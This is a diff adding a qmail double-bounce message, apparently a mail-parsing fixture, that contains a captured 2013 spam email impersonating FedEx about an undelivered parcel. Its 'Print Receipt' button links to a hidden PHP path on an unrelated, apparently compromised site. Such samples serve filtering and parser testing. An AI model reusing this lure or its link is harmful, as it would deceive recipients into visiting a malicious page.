@@ -1,0 +1,314 @@
+Return-Path: <#@[]>
+Delivered-To: double-bounce@example.com
+Received: (qmail 6541 invoked for bounce); 10 Apr 2013 05:07:41 +0900
+Date: 10 Apr 2013 05:07:41 +0900
+From: MAILER-DAEMON@example.com
+To: double-bounce@example.com
+Subject: failure notice
+
+Hi. This is the qmail-send program at example.com.
+I tried to deliver a bounce message to this address, but the bounce bounced!
+
+<service@postaltracking.com>:
+Sorry, I wasn't able to establish an SMTP connection. (#4.4.1)
+I'm not going to try again; this message has been in the queue too long.
+
+--- Below this line is the original bounce.
+
+Return-Path: <>
+Received: (qmail 23654 invoked for bounce); 7 Apr 2013 02:00:00 +0900
+Date: 7 Apr 2013 02:00:00 +0900
+From: MAILER-DAEMON@example.com
+To: service@postaltracking.com
+Subject: failure notice
+
+Hi. This is the qmail-send program at example.com.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
+
+<herc@example.org>:
+Sorry, no mailbox here by that name. (#5.1.1)
+
+--- Below this line is a copy of the message.
+
+Return-Path: <service@postaltracking.com>
+Received: (qmail 23651 invoked from network); 7 Apr 2013 02:00:00 +0900
+Received: from unknown (HELO example.com) (127.0.0.1)
+  by localhost with SMTP; 7 Apr 2013 02:00:00 +0900
+Received: from example.com (localhost [127.0.0.1])
+	by example.com (Postfix) with ESMTP id C248AB86
+	for <herc@example.org>; Sun,  7 Apr 2013 01:59:54 +0900 (JST)
+Received: from sunny.example.org (v-182-163-58-172.ub-freebit.net [182.163.58.172])
+	by example.com (Postfix) with ESMTPS
+	for <herc@example.org>; Sun,  7 Apr 2013 01:59:48 +0900 (JST)
+Received: from postaltracking.com (c-174-57-47-222.hsd1.nj.comcast.net [174.57.47.222])
+	by sunny.example.org (Postfix) with SMTP id F1C5C10DC05AA
+	for <herc@example.org>; Sun,  7 Apr 2013 01:59:41 +0900 (JST)
+Message-ID: <002501ce32e8$2071d415$0201a8c0@Judee-PC>
+From: "Manager Ishaan Jarvis" <service@postaltracking.com>
+To: <herc@example.org>
+Subject: Order Shipped	 
+Date: Sat, 06 Apr 2013 A.D. 12:59:39 -0400
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0020_01CE32C6.995E98B0"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2900.2180
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2180
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0020_01CE32C6.995E98B0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+   FedEx
+
+   Tracking ID: 8845-19652524
+
+   Date: Monday, 1 April 2013, 11:05 AM
+
+   Dear Client,
+
+   Your parcel has arrived at April 4.Courier was unable to deliver the
+   parcel to you at 4 April 05:48 PM.
+
+   To receive your parcel, please, print this receipt and go to the
+   nearest office.
+
+   Print Receipt
+
+   Best Regards, The FedEx Team.
+
+   FedEx 1995-2013
+
+------=_NextPart_000_0020_01CE32C6.995E98B0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+
+<head>
+
+<title>
+Joint chiefs chairman in Afghanistan for talks
+</title>
+
+</head>
+
+<body bgcolor="#FFFFFF">
+
+<table border="1" width="485" 
+     style="border-width: 0px; border-collapse:collapse">
+<tr>
+<td width="355" style="border-style: none; 
+    border-width: medium" bgcolor="#FFFFFF" colspan="3">
+<b>
+<font size="6" face="Arial Black">
+<span style="letter-spacing: -5px">
+<font color="#4D148C">Fed</font><font color="#AAAAAA">Ex</font>
+</span>
+</font>
+</b>
+</td>
+
+<td style="border-style: none; 
+    border-width: medium" bgcolor="#FFFFFF" width="139">
+</td>
+</tr>
+
+<tr>
+<td width="355" style="border-style: none; 
+    border-width: medium" bgcolor="#4D148C" colspan="3">
+</td>
+<td style="border-style: none; 
+    border-width: medium" bgcolor="#4D148C" width="139">
+</td>
+</tr>
+
+<tr>
+<td width="355" style="border-style: none; 
+        border-width: medium" colspan="3">
+    <font face="Verdana" size="2"><font color="#4D148C">
+    <b>Tracking ID:</b></font>
+    <font color="#515151">8845-19652524
+</font></font>
+</td>
+
+<td style="border-style: none; 
+        border-width: medium" width="139" rowspan="2">
+</td>
+</tr>
+
+<tr>
+<td width="355" style="border-style: none; 
+        border-width: medium" height="22" colspan="3">
+    <font face="Verdana" size="2"><font color="#4D148C">
+    <b>Date:</b></font> 
+    <b>
+    <font color="#515151">
+        Monday, 1 April 2013, 11:05 AM
+    </font>
+    </b>
+    </font>
+</td>
+</tr>
+
+<tr>
+<td width="483" style="border-style: none; 
+        border-width: medium" colspan="4" height="152">
+<p align="left">
+    &nbsp;</p>
+<p align="left">
+    <font face="Verdana" size="2" color="#515151">
+    <b>Dear Client,</b>
+</font>
+</p>
+<p align="left">
+    <font size="2" face="Verdana" color="#515151">
+    Your parcel has arrived at April 4.Courier was 
+    unable to deliver 
+    the parcel to you at <b>4 April 05:48 PM</b>.
+    </font>
+</p>
+<p align="left">
+    <font size="2" face="Verdana" color="#515151">
+        To receive your parcel, please, print this 
+        receipt and go to the 
+        nearest office.
+    </font>
+</p>
+
+<p align="left"></p>
+</td>
+</tr>
+
+<tr>
+<td width="145" style="border-style: none; 
+border-width: medium" height="31">
+    <p align="left">
+        <font color="#4D148C">
+            <b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b>
+        </font>
+    </p>
+</td>
+
+<td width="183" style="border-style: none; 
+border-width: medium" height="31" bgcolor="#4D148C">
+    <p align="center">
+        <font color="#4D148C">
+            <b>
+<span style="background-color: #4D148C">
+                    <a 
+href="http://www.bchimd.org/components/.jny8lz.php?action=3Dss00_323"
+                    >
+                        <font color="#FFFFFF" size="4" 
+        face="Verdana">
+<span style="text-decoration: none; font-style:italic">
+                            Print Receipt
+                        </span>
+                        </font>
+                    </a>
+</span>
+            </b>
+        </font>
+    </p>
+</td>
+
+<td width="150" style="border-style: none; 
+        border-width: medium" height="31" colspan="2">
+</td>
+</tr>
+
+<tr>
+<td width="483" style="border-style: none; 
+        border-width: medium" colspan="4" height="36">
+</td>
+</tr>
+
+<tr>
+<td width="483" style="border-style: none; 
+        border-width: medium" colspan="4" height="21">
+    <font size="2" face="Verdana" color="#515151">
+        Best Regards, The FedEx Team.
+    </font>
+</td>
+</tr>
+
+<tr>
+<td width="355" style="border-left-style:none; 
+        border-left-width:medium; 
+        border-right-style:none; 
+        border-right-width:medium; 
+        border-top-style:none; 
+        border-top-width:medium; 
+        border-bottom-style:solid; 
+        border-bottom-width:1px" 
+        height="22" colspan="3">
+</td>
+
+<td style="border-left-style:none; 
+        border-left-width:medium; 
+        border-right-style:none; 
+        border-right-width:medium; 
+        border-top-style:none; 
+        border-top-width:medium; 
+        border-bottom-style:solid; 
+        border-bottom-width:1px" 
+        height="22" width="139">
+</td>
+</tr>
+
+<tr>
+<td width="355" style="border-left-style:none; 
+        border-left-width:medium; 
+        border-right-style:none; 
+        border-right-width:medium; 
+        border-bottom-style:none; 
+        border-bottom-width:medium" height="18" colspan="3">
+        
+    <span style="color: rgb(170, 170, 170); 
+            font-family: Arial, Helvetica, sans-serif; 
+            font-size: 11px; 
+            font-style: normal; 
+            font-variant: normal; 
+            font-weight: normal; 
+            letter-spacing: normal; 
+            line-height: 14.300000190734863px; 
+            orphans: 2; 
+            text-align: start; 
+            text-indent: 0px; 
+            text-transform: none; 
+            white-space: normal; 
+            widows: 2;
+            word-spacing: 0px; 
+            -webkit-text-size-adjust: auto; 
+            -webkit-text-stroke-width: 0px; 
+            display: inline !important; 
+            float: none; ">
+        FedEx 1995-2013
+    </span>
+</td>
+
+<td style="border-left-style:none; 
+        border-left-width:medium; 
+        border-right-style:none; 
+        border-right-width:medium; 
+        border-bottom-style:none; 
+        border-bottom-width:medium" 
+        height="18" width="139">
+</td>
+</tr>
+
+</table>
+
+</body>
+</html>
+
+
+------=_NextPart_000_0020_01CE32C6.995E98B0--
+
+
